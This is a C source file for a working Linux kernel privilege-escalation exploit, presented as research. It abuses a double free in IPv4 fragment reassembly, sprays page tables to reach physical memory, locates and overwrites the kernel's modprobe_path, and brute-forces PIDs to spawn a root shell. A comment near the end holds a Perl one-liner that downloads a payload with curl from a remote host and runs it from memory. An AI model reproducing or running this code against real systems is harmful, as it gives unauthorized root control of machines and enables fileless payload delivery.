// This program, and the other programs and scripts ("programs", "these programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

#define _GNU_SOURCE 1
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <fcntl.h>
#include <sys/xattr.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "env.h"
#include "net.h"
#include "nftnl.h"
#include "file.h"
#include "config.h"
#include "file.h"

static char intermed_buf[1 << 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}

static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[*] sending double free buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	PRINTF_VERBOSE("[*] sending intermediate buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}

static void alloc_ipv4_udp(size_t content_size)
{
	PRINTF_VERBOSE("[*] sending udp packet...\n");
	memset(intermed_buf, '\x00', content_size);
	send_ipv4_udp(intermed_buf, content_size);
}

static void set_ipfrag_time(unsigned int seconds)
{
	int fd;
	
	fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY);
	if (fd < 0) {
		perror("open$ipfrag_time");
		exit(1);
	}

	dprintf(fd, "%u\n", seconds);
	close(fd);
}

static void pin_cpu(int cpu_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask); // clear the CPU set
    CPU_SET(cpu_id, &mask); // set the bit that represents CPU x

    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) {
        perror("sched_setaffinity");
        exit(1); 
    } 
}

static void modprobe_trigger_memfd()
{
	int fd;
	char *argv_envp = NULL;

	fd = memfd_create("", MFD_CLOEXEC);
	write(fd, "\xff\xff\xff\xff", 4);

	fexecve(fd, &argv_envp, &argv_envp);
	
	close(fd);
}

#define FLUSH_STAT_INPROGRESS 0
#define FLUSH_STAT_DONE 1
#define EXPLOIT_STAT_RUNNING 0
#define EXPLOIT_STAT_FINISHED 3

#define SPINLOCK(cmp) while (cmp) { usleep(10 * 1000); }

// presumably needs to be CPU pinned
static void flush_tlb(void *addr, size_t len)
{
	short *status;

	status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	*status = FLUSH_STAT_INPROGRESS;
	if (fork() == 0)
	{
		munmap(addr, len);
		*status = FLUSH_STAT_DONE;
		PRINTF_VERBOSE("[*] flush tlb thread gonna sleep\n");
		sleep(9999);
	}

	SPINLOCK(*status == FLUSH_STAT_INPROGRESS);

	munmap(status, sizeof(short));
}

#define MEMCPY_HOST_FD_PATH(buf, pid, fd) sprintf((buf), "/proc/%u/fd/%u", (pid), (fd));

static int is_kernel_base(unsigned char *addr)
{
	// thanks python
	
	// get-sig kernel_runtime_1
	if (memcmp(addr + 0x0, "\x48\x8d\x25\x51\x3f", 5) == 0 &&
			memcmp(addr + 0x7, "\x48\x8d\x3d\xf2\xff\xff\xff", 7) == 0)
		return 1;

	// get-sig kernel_runtime_2
	if (memcmp(addr + 0x0, "\xfc\x0f\x01\x15", 4) == 0 &&
			memcmp(addr + 0x8, "\xb8\x10\x00\x00\x00\x8e\xd8\x8e\xc0\x8e\xd0\xbf", 12) == 0 &&
			memcmp(addr + 0x18, "\x89\xde\x8b\x0d", 4) == 0 &&
			memcmp(addr + 0x20, "\xc1\xe9\x02\xf3\xa5\xbc", 6) == 0 &&
			memcmp(addr + 0x2a, "\x0f\x20\xe0\x83\xc8\x20\x0f\x22\xe0\xb9\x80\x00\x00\xc0\x0f\x32\x0f\xba\xe8\x08\x0f\x30\xb8\x00", 24) == 0 &&
			memcmp(addr + 0x45, "\x0f\x22\xd8\xb8\x01\x00\x00\x80\x0f\x22\xc0\xea\x57\x00\x00", 15) == 0 &&
			memcmp(addr + 0x55, "\x08\x00\xb9\x01\x01\x00\xc0\xb8", 8) == 0 &&
			memcmp(addr + 0x61, "\x31\xd2\x0f\x30\xe8", 5) == 0 &&
			memcmp(addr + 0x6a, "\x48\xc7\xc6", 3) == 0 &&
			memcmp(addr + 0x71, "\x48\xc7\xc0\x80\x00\x00", 6) == 0 &&
			memcmp(addr + 0x78, "\xff\xe0", 2) == 0)
		return 1;


	return 0;
}

static void busy_msleep(int target_ms)
{
    struct timeval start, end;
	long elapsed_ms;
	
    gettimeofday(&start, NULL);

LAB_POLL_TIME:
    gettimeofday(&end, NULL);
    elapsed_ms = ((end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec)/1000.0) + 0.5;
	if (elapsed_ms < target_ms)
		goto LAB_POLL_TIME;
}

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

static int get_modprobe_path(char *buf, size_t buflen)
{
	int size;

	size = read_file("/proc/sys/kernel/modprobe", buf, buflen);

	if (size == buflen)
		printf("[*] ==== read max amount of modprobe_path bytes, perhaps increment KMOD_PATH_LEN? ====\n");

	// remove \x0a
	buf[size-1] = '\x00';

	return size;
}

static int strcmp_modprobe_path(char *new_str)
{
	char buf[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(buf, KMOD_PATH_LEN);
	
	return strncmp(new_str, buf, KMOD_PATH_LEN);
}

static void breached_the_mainframe()
{
	printf("\n==== INITIATING MAINFRAME BREACH PROTOCOL ====\n");
	printf("[*] going to inject sql payload into the external mainframe smart contract interface...\n");
	busy_msleep(100);
	printf("[*] dumping runtime core memory of the root smart contract..\n");
	busy_msleep(400);
	printf("[+] detected unix system\n");
	printf("[*] extracting credentials from the mainframe...\n");
	busy_msleep(200);
	printf("[*] sending network-based smb hypertrojan with credentials...\n");
	busy_msleep(300);
	printf("[*] executing xss local file write to hijack systemd user...\n");
	busy_msleep(200);
	printf("[+] hacked the exterior layer of the datacenter mainframe\n");
	printf("[*] going to escalate the quantum privilege of wifi driver...\n");
	busy_msleep(100);
	printf("[+] achieved target: breached the mainframe\n");
}

void *memmem_modprobe_path(void *haystack_virt, size_t haystack_len, char *modprobe_path_str, size_t modprobe_path_len)
{
	void *pmd_modprobe_addr;

	// search 0x200000 bytes (a full PTE at a time) for the modprobe_path signature
	pmd_modprobe_addr = memmem(haystack_virt, haystack_len, modprobe_path_str, modprobe_path_len);
	if (pmd_modprobe_addr == NULL)
		return NULL;

	// check if this is the actual modprobe by overwriting it, and checking /proc/sys/kernel/modprobe
	strcpy(pmd_modprobe_addr, "/sanitycheck");
	if (strcmp_modprobe_path("/sanitycheck") != 0)
	{
		printf("[-] ^false positive. skipping to next one\n");
		return NULL;
	}

	return pmd_modprobe_addr;
}

static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
{
	unsigned long long *pte_area;
	void *_pmd_area;
	void *pmd_kernel_area;
	void *pmd_data_area;
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};
	char modprobe_path[KMOD_PATH_LEN] = { '\x00' };

	get_modprobe_path(modprobe_path, KMOD_PATH_LEN);

	printf("[+] running normal privesc\n");

    PRINTF_VERBOSE("[*] doing first useless allocs to setup caching and stuff...\n");

	pin_cpu(0);

	// allocate PUD (and a PMD+PTE) for PMD
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
	// needs to be minimal since VMA registration costs memory
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
	
	// these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	pmd_kernel_area = _pmd_area;
	pmd_data_area = _pmd_area + 0x200000;

	PRINTF_VERBOSE("[*] allocated VMAs for process:\n  - pte_area: ?\n  - _pmd_area: %p\n  - modprobe_path: '%s' @ %p\n", _pmd_area, modprobe_path, modprobe_path);

	populate_sockets();

	set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

	set_ipfrag_time(9999);

	printf("[*] waiting for the calm before the storm...\n");
	sleep(CONFIG_SEC_BEFORE_STORM);

	// pop N skbs from skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		alloc_ipv4_udp(1);
	}

	// allocate and free 1 skb from freelist
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
	trigger_double_free_hdr(32768 + 8, &df_ip_header);
	
	// push N skbs to skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		recv_ipv4_udp(1);
	}

	// spray-allocate the PTEs from PCP allocator order-0 list
	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

	PRINTF_VERBOSE("[*] double-freeing skb...\n");

	// cause double-free on skb from earlier
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
	
	// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
	// causes end == offset in ip_frag_queue(). packet will be empty
	// remains running until after both frees, a.k.a. does not require sleep
	alloc_intermed_buf_hdr(0, &df_ip_header);

	// allocate overlapping PMD page (overlaps with PTE)
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;

	printf("[*] checking %d sprayed pte's for overlap...\n", CONFIG_PTE_SPRAY_AMOUNT);

	// find overlapped PTE area
	pte_area = NULL;
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);

		// pte entry pte[0] should be the PFN+flags for &_pmd_area
		// if this is the double allocated PTE, the value is PFN+flags, not 0x41
		if (*test_target_addr != 0x41)
		{
			printf("[+] confirmed double alloc PMD/PTE\n");
			PRINTF_VERBOSE("    - PTE area index: %lld\n", i);
			PRINTF_VERBOSE("    - PTE area (write target address/page): %016llx (new)\n", *test_target_addr);
			pte_area = test_target_addr;
		}
	}

	if (pte_area == NULL)
	{
		printf("[-] failed to detect overwritten pte: is more PTE spray needed? pmd: %016llx\n", *(unsigned long long*)_pmd_area);

		return;
	}
	
	// set new pte value for sanity check
	*pte_area = 0x0 | 0x8000000000000867;

	flush_tlb(_pmd_area, 0x400000);
	PRINTF_VERBOSE("    - PMD area (read target value/page): %016llx (new)\n", *(unsigned long long*)_pmd_area);

	// run this script instead of /sbin/modprobe
	int modprobe_script_fd = memfd_create("", MFD_CLOEXEC);
	int status_fd = memfd_create("", 0);
	
	// range = (k * j) * CONFIG_PHYSICAL_ALIGN
	// scan 512 pages (1 PTE worth) for kernel base each iteration
	for (int k=0; k < (CONFIG_PHYS_MEM / (CONFIG_PHYSICAL_ALIGN * 512)); k++)
	{
		unsigned long long kernel_iteration_base;

		kernel_iteration_base = k * (CONFIG_PHYSICAL_ALIGN * 512);

		PRINTF_VERBOSE("[*] setting kernel physical address range to 0x%016llx - 0x%016llx\n", kernel_iteration_base, kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * 512);
		for (unsigned short j=0; j < 512; j++)
			pte_area[j] = (kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j) | 0x8000000000000867;

		flush_tlb(_pmd_area, 0x400000);

		// scan 1 page (instead of CONFIG_PHYSICAL_ALIGN) for kernel base each iteration
		for (unsigned long long j=0; j < 512; j++) 
		{
			unsigned long long phys_kernel_base;
		
			// check for x64-gcc/clang signatures of kernel code segment at rest and at runtime
			// - this "kernel base" is actually the assembly bytecode of start_64() and variants
			// - it's different per architecture and per compiler (clang produces different signature than gcc)
			// - this can be derived from the vmlinux file by checking the second segment, which starts likely at binary offset 0x200000
			//   - i.e: xxd ./vmlinux | grep '00200000:'
			
			phys_kernel_base = kernel_iteration_base + CONFIG_PHYSICAL_ALIGN * j;

			PRINTF_VERBOSE("[*] phys kernel addr: %016llx, val: %016llx\n", phys_kernel_base, *(unsigned long long*)(pmd_kernel_area + j * 0x1000));

			if (is_kernel_base(pmd_kernel_area + j * 0x1000) == 0)
				continue;

			printf("[+] found possible physical kernel base: %016llx\n", phys_kernel_base);
			
			// scan 40 * 0x200000 (2MiB) = 0x5000000 (80MiB) bytes from kernel base for modprobe path. if not found, just search for another kernel base
			for (int i=0; i < 40; i++) 
			{
				void *pmd_modprobe_addr;
				unsigned long long phys_modprobe_addr;
				unsigned long long modprobe_iteration_base;

				modprobe_iteration_base = phys_kernel_base + i * 0x200000;

				PRINTF_VERBOSE("[*] setting physical address range to 0x%016llx - 0x%016llx\n", modprobe_iteration_base, modprobe_iteration_base + 0x200000);

				// set the pages for the other threads PUD data range to kernel memory
				for (unsigned short j=0; j < 512; j++)
					pte_area[512 + j] = (modprobe_iteration_base + 0x1000 * j) | 0x8000000000000867;

				flush_tlb(_pmd_area, 0x400000);
				
#if CONFIG_STATIC_USERMODEHELPER
				pmd_modprobe_addr = memmem(pmd_data_area, 0x200000, CONFIG_STATIC_USERMODEHELPER_PATH, strlen(CONFIG_STATIC_USERMODEHELPER_PATH));
#else
				pmd_modprobe_addr = memmem_modprobe_path(pmd_data_area, 0x200000, modprobe_path, KMOD_PATH_LEN);
#endif
				if (pmd_modprobe_addr == NULL)
					continue;

#if CONFIG_LEET
				breached_the_mainframe();
#endif

				phys_modprobe_addr = modprobe_iteration_base + (pmd_modprobe_addr - pmd_data_area);
				printf("[+] verified modprobe_path/usermodehelper_path: %016llx ('%s')...\n", phys_modprobe_addr, (char*)pmd_modprobe_addr);

				PRINTF_VERBOSE("[*] modprobe_script_fd: %d, status_fd: %d\n", modprobe_script_fd, status_fd);
				
				printf("[*] overwriting path with PIDs in range 0->4194304...\n");
				for (pid_t pid_guess=0; pid_guess < 4194304; pid_guess++)
				{
					int status_cnt;
					char buf;

					// overwrite the `modprobe_path` kernel variable to "/proc/<pid>/fd/<script_fd>"
					// - use /proc/<pid>/* since container path may differ, may not be accessible, et cetera
					// - it must be root namespace PIDs, and can't get the root ns pid from within other namespace
					MEMCPY_HOST_FD_PATH(pmd_modprobe_addr, pid_guess, modprobe_script_fd);

					if (pid_guess % 50 == 0)
					{
						PRINTF_VERBOSE("[+] overwriting modprobe_path with different PIDs (%u-%u)...\n", pid_guess, pid_guess + 50);
						PRINTF_VERBOSE("    - i.e. '%s' @ %p...\n", (char*)pmd_modprobe_addr, pmd_modprobe_addr);
						PRINTF_VERBOSE("    - matching modprobe_path scan var: '%s' @ %p)...\n", modprobe_path, modprobe_path);
					}
						
					lseek(modprobe_script_fd, 0, SEEK_SET); // overwrite previous entry
					dprintf(modprobe_script_fd, "#!/bin/sh\necho -n 1 1>/proc/%u/fd/%u\n/bin/sh 0</proc/%u/fd/%u 1>/proc/%u/fd/%u 2>&1\n", pid_guess, status_fd, pid_guess, shell_stdin_fd, pid_guess, shell_stdout_fd);

					// run custom modprobe file as root, by triggering it by executing file with unknown binfmt
					// if the PID is incorrect, nothing will happen
					modprobe_trigger_memfd();

					// indicates correct PID (and root shell). stops further bruteforcing
					status_cnt = read(status_fd, &buf, 1);
					if (status_cnt == 0)
						continue;

					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);

					return;
				}

				printf("[!] verified modprobe_path address does not work... CONFIG_STATIC_USERMODEHELPER enabled?\n");

				return;
			}
			
			printf("[-] failed to find correct modprobe_path: trying to find new kernel base...\n");
		}
	}

	printf("[!] failed to find kernel code segment... CONFIG_STATIC_USERMODEHELPER disabled?\n");
	return;
}

/*
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  open(my $fh, ">&=".$fd);
  print $fh `curl http://172.23.0.1:1337/main -s`;
  exec {"/proc/$$/fd/$fd"} "memfd";
'
*/

void signal_handler_sleep(int sig)
{
	printf("[*] handling ctrl-c by sleeping background thread\n");
	printf("!! >> if you did this while in the root shell, the terminal will be messed up << !!\n");
	sleep(9999);
}

int main()
{
	int *exploit_status;

	exploit_status = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*exploit_status = EXPLOIT_STAT_RUNNING;

	// detaches program and makes it sleep in background when succeeding or failing
	// - prevents kernel system instability when trying to free resources
	if (fork() == 0)
	{
		int shell_stdin_fd;
		int shell_stdout_fd;

		signal(SIGINT, signal_handler_sleep);

		// open copies of stdout etc which will not be redirected when stdout is redirected, but will be printed to user
		shell_stdin_fd = dup(STDIN_FILENO);
		shell_stdout_fd = dup(STDOUT_FILENO);

#if CONFIG_REDIRECT_LOG
		setup_log("exp.log");
#endif

		setup_env();
 
		privesc_flh_bypass_no_time(shell_stdin_fd, shell_stdout_fd);

		*exploit_status = EXPLOIT_STAT_FINISHED;

		// prevent crashes due to invalid pagetables
		sleep(9999);
	}

	// prevent premature exits
	SPINLOCK(*exploit_status == EXPLOIT_STAT_RUNNING);

	return 0;
}
